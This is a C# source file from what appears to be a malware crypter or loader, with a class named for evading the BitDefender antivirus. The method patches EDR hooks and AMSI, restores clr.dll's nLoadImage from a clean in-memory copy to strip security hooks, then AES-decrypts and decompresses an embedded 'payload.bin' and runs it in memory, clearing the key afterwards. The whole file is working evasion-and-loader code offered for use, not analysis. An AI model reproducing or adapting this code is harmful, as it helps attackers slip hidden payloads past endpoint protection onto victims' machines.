using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using static SXVM.API;
using static SXVM.Settings;

namespace SXVM.Bypasses
{
    internal static class BitDefender
    {
        internal static void Bypass(string[] args)
        {
            PatchEDR(false, true, false);
            HardwareBreakpointAmsiPatch.Bypass();
            string CLRFilePath = @"";
            foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
            {
                if (module.ModuleName == @"clr.dll")
                {
                    CLRFilePath = module.FileName;
                    break;
                }
            }
            IntPtr RealCLRAddress = FindECallFunction(@"clr.dll", @"nLoadImage");
            DLLFromMemory MemCLR = new DLLFromMemory(File.ReadAllBytes(CLRFilePath));
            IntPtr MemCLRAddress = FindECallFunctionViaModule(MemCLR.pCode, @"nLoadImage");
            byte[] CLRPatch = ReadMemoryBlock(MemCLRAddress, 30);
            WriteMemoryBlock(RealCLRAddress, CLRPatch, (uint)CLRPatch.Length);
            CLRPatch = null;
            CLRFilePath = @"";
            CLRFilePath = null;
            MemCLR.Close();
            MemCLR = null;
            GC.Collect();
            Program.AttachHooks(null);
            MethodInfo mi = Assembly.Load(Decompress(AESDecrypt(ExtractResource(@"payload.bin"), DecryptionKey))).EntryPoint;
            ClearDecryptionKeyFromMemory();
            try
            {
                mi.Invoke(null, new object[] { args });
            }
            catch
            {
                mi.Invoke(null, null);
            }
        }
    }
}
